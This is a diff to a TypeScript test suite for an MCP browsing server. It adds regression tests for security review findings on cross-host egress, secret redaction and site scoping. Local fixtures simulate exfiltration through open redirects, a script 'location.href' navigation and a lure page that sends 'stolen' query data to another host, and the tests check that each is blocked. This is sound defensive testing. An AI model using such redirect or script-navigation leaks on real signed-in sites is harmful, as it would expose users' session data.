@@ -6,7 +6,7 @@ import path from 'node:path';
 import fs from 'node:fs';
 import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
 import { Client } from '@modelcontextprotocol/sdk/client/index.js';
-import { ElicitRequestSchema } from '@modelcontextprotocol/sdk/types.js';
+import { CreateMessageRequestSchema, ElicitRequestSchema } from '@modelcontextprotocol/sdk/types.js';
 import { createServer } from '../../src/server.js';
 import { UsageTracker } from '../../src/cost/tracker.js';
 import { DEFAULT_CONFIG, type LocalMcpConfig } from '../../src/config/schema.js';
@@ -93,7 +93,21 @@ beforeAll(async () => {
     }
     if (url.startsWith('/keys')) {
       res.writeHead(200, { 'content-type': 'text/html' });
-      return res.end(`<title>Keys</title><main><h1>API keys</h1><p>Secret key: <code>${FAKE_STRIPE}</code></p></main>`);
+      return res.end(`<title>Keys</title><main><h1>API keys</h1><p>Secret key: <code>${FAKE_STRIPE}</code></p>
+        <table><tr><th>Name</th><th>Key</th></tr><tr><td>prod</td><td>${FAKE_STRIPE}</td></tr></table></main>`);
+    }
+    if (url === '/go') {
+      // An open redirect on the signed-in site, pointed at someone else with data in the query.
+      res.writeHead(302, { location: `http://127.0.0.1:${port}/landed?d=stolen-redirect` });
+      return res.end();
+    }
+    if (url === '/hop') {
+      res.writeHead(302, { location: '/go' }); // same-site hop first: the browser follows it unrouted
+      return res.end();
+    }
+    if (url === '/jsgo') {
+      res.writeHead(200, { 'content-type': 'text/html' });
+      return res.end(`<title>JS</title><script>location.href = "http://127.0.0.1:${port}/landed?d=stolen-js"</script>`);
     }
     if (url === '/lure') {
       // A third-party page that tries to use the signed-in site's session from inside the browser.
@@ -248,6 +262,129 @@ describe('egress guard after a signed-in read', () => {
     const allowed = await connect(scopedConfig({ allow: ['localhost:*', '127.0.0.1:*'] }));
     await allowed.client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
     expect((await allowed.client.callTool({ name: 'browse', arguments: { url: stranger('/x') } })).isError).toBeFalsy();
+  });
+});
+
+describe('review findings (2026-11-25): each one stays fixed', () => {
+  const leaked = (tag: string) => cookieSeen.some((h) => h.path.includes(tag));
+
+  it('#1 all-hosts scope: reading the attacker page first does not approve it', async () => {
+    const cfg = scopedConfig();
+    fs.rmSync(path.join(cfg.browser.profileDir, 'localmcp-sites.json')); // legacy profile: all hosts signed in
+    const { client } = await connect(cfg);
+    await client.callTool({ name: 'browse', arguments: { url: stranger('/lure') } });
+    await client.callTool({ name: 'browse', arguments: { url: signedIn('/keys') } });
+    cookieSeen.length = 0;
+    const r = await client.callTool({ name: 'browse', arguments: { url: stranger('/x?d=stolen-allhosts') } });
+    expect(r.isError).toBe(true);
+    expect(texts(r)).toMatch(/sites add/);
+    expect(leaked('stolen-allhosts')).toBe(false);
+  });
+
+  it('#2 a server redirect from a signed-in site to another host is stopped before it is sent', async () => {
+    const { client } = await connect(scopedConfig());
+    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
+    cookieSeen.length = 0;
+    for (const p of ['/go', '/hop']) {
+      const r = await client.callTool({ name: 'browse', arguments: { url: signedIn(p) } });
+      expect(r.isError).toBe(true);
+    }
+    expect(leaked('stolen-redirect')).toBe(false);
+  });
+
+  it('#2 a script navigation to another host is stopped too', async () => {
+    const { client } = await connect(scopedConfig());
+    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo') } });
+    cookieSeen.length = 0;
+    await client.callTool({ name: 'browse', arguments: { url: signedIn('/jsgo') } });
+    expect(leaked('stolen-js')).toBe(false);
+  });
+
+  it('#2 even the first signed-in call is guarded; control: with egress "open" the redirect leaks', async () => {
+    const guarded = await connect(scopedConfig());
+    cookieSeen.length = 0;
+    await guarded.client.callTool({ name: 'browse', arguments: { url: signedIn('/go') } });
+    expect(leaked('stolen-redirect')).toBe(false);
+
+    const open = await connect(scopedConfig({ egress: 'open' }));
+    cookieSeen.length = 0;
+    await open.client.callTool({ name: 'browse', arguments: { url: signedIn('/go') } });
+    expect(leaked('stolen-redirect')).toBe(true);
+  });
+
+  it('#3 the race: a call made while a signed-in read is in flight is already guarded', async () => {
+    const { client } = await connect(scopedConfig());
+    cookieSeen.length = 0;
+    const [, out] = await Promise.all([
+      client.callTool({ name: 'browse', arguments: { url: signedIn('/keys') } }),
+      client.callTool({ name: 'browse', arguments: { url: stranger('/x?d=stolen-race') } }),
+    ]);
+    expect(out.isError).toBe(true);
+    expect(leaked('stolen-race')).toBe(false);
+  });
+
+  it('#4 redaction is linear on hostile input and removes truncated keys', () => {
+    const hostile = '-----BEGIN PRIVATE KEY-----\n'.repeat(200_000);
+    const t = Date.now();
+    redactSecrets(hostile);
+    expect(Date.now() - t).toBeLessThan(2_000);
+    const cut = ['-----BEGIN', 'PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC'].join(' ');
+    expect(redactSecrets(`a ${cut}`).text).toBe('a [redacted private-key]');
+  });
+
+  it('#5 the sampling prompt is redacted before it reaches the client model', async () => {
+    const tracker = new UsageTracker(path.join(tmp(), 'usage.db'));
+    const srv = createServer({ config: scopedConfig(), tracker });
+    const [ct, st] = InMemoryTransport.createLinkedPair();
+    await srv.connect(st);
+    const prompts: string[] = [];
+    const client = new Client({ name: 'sampler', version: '1.0.0' }, { capabilities: { sampling: {} } });
+    client.setRequestHandler(CreateMessageRequestSchema, async (req) => {
+      prompts.push(JSON.stringify(req.params.messages));
+      return { role: 'assistant', model: 'fake', content: { type: 'text', text: '{"keys":[]}' } };
+    });
+    await client.connect(ct);
+    closers.push(async () => { await client.close(); await srv.close(); tracker.close(); });
+    await client.callTool({ name: 'extract', arguments: { url: signedIn('/keys'), schema: { keys: ['string'] } } });
+    expect(prompts.length).toBe(1);
+    expect(prompts[0]).not.toContain(FAKE_STRIPE);
+  });
+
+  it('#6 usage.db never stores query strings', async () => {
+    const dbPath = path.join(tmp(), 'usage.db');
+    const tracker = new UsageTracker(dbPath);
+    const srv = createServer({ config: scopedConfig(), tracker });
+    const [ct, st] = InMemoryTransport.createLinkedPair();
+    await srv.connect(st);
+    const client = new Client({ name: 'db', version: '1.0.0' });
+    await client.connect(ct);
+    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo?magic=hunter2'), diff: true } });
+    await client.callTool({ name: 'browse', arguments: { url: signedIn('/echo?magic=hunter2'), diff: true } });
+    const snaps = tracker.listSnapshots();
+    await client.close(); await srv.close(); tracker.close();
+    expect(fs.readFileSync(dbPath).includes(Buffer.from('hunter2'))).toBe(false);
+    expect(snaps).toHaveLength(1); // the hashed key still identifies the page for diffs
+  });
+
+  it('#7 dates, timestamps and phone numbers are not mistaken for cards', () => {
+    for (const s of ['2024-01-15 2024-01-16', '1732579200000', 'call 4155550100 now', '2026 2027 2028 2029']) {
+      expect(redactSecrets(s).text).toBe(s);
+    }
+    expect(redactSecrets('3782 822463 10005').text).toContain('[redacted card-number…0005]'); // Amex test card
+  });
+
+  it('#8 public-suffix wildcards are refused; site list changes apply without a restart', () => {
+    for (const w of ['*.com', '*.co.uk', '*.github.io', '*.pages.dev']) expect(normaliseSite(w)).toBeNull();
+    expect(normaliseSite('*.stripe.com')).toBe('*.stripe.com');
+
+    const profileDir = path.join(tmp(), 'profile');
+    addSite(profileDir, 'localhost');
+    const manager = new BrowserManager({ profile: 'persistent', profileDir });
+    expect(manager.routeFor(stranger('/'))).toBe('anonymous');
+    addSite(profileDir, '127.0.0.1');
+    expect(manager.routeFor(stranger('/'))).toBe('signed-in');
+    removeSite(profileDir, '127.0.0.1');
+    expect(manager.routeFor(stranger('/'))).toBe('anonymous');
   });
 });
 
